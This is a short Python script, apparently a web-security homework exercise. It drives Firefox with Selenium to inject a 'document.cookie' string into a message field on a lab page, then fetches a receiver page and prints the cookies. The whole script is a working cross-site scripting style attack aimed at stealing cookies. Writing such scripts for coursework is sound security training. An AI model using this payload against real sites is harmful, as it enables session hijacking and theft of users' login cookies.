#!/usr/bin/python
import requests
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

url = 'http://www.wsb.com/Homework3/case05/controller.php'
print("Opening Firefox...")
driver = webdriver.Firefox()
driver.get(url)

msg = driver.find_element_by_id("msg")
msg.clear()
msg.send_keys("\"+document.cookie+\"")

send = driver.find_element_by_id("send")
send.click()

#driver.close()

# Direct request
url2 = 'https://www.wsb.com/Homework3/case05/receiver.php'
s = requests.Session()
res = s.get(url2, verify=False)
#print(res.text)
print(s.cookies.get_dict())
